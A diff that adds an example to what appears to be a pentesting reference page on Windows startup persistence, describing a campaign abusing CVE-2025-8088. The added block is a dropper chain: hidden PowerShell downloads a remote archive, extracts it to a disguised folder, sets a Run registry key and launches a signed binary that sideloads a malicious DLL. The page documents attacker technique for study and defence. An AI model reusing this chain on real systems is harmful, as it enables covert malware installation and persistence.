@@ -48,6 +48,20 @@ Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
 ../../generic-hacking/archive-extraction-path-traversal.md
 {{#endref}}
 
+### Startup dropper chain example (CVE-2025-8088)
+
+A practical abuse seen in 2025 campaigns:
+
+```cmd
+# dropped .cmd inside Startup via path traversal
+powershell -w hidden (New-Object Net.WebClient).DownloadFile(`RAR_URL`, %TEMP%\u.rar)
+rar.exe x -hp`pass` %TEMP%\u.rar C:\Users\Public\Documents\Microsoft\winupdate_v%RANDOM%%TIME:~3,2%\
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v `rand` /d `exe_path`
+start "" `exe_path`   # signed host sideloads malicious DLL
+```
+
+Even if the victim only unpacks the archive, the auto-started script will fetch the second stage on reboot/logon, install a Run key, and execute the signed binary that sideloads the attacker DLL.
+
 
 
 ## Registry
@@ -346,6 +360,7 @@ autorunsc.exe -m -nobanner -a * -ct /accepteula
 - [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
 - [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
 - [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
+- [Check Point Research – Amaranth-Dragon weaponises CVE-2025-8088 for targeted espionage](https://research.checkpoint.com/2026/amaranth-dragon-weaponizes-cve-2025-8088-for-targeted-espionage/)
 
 
 
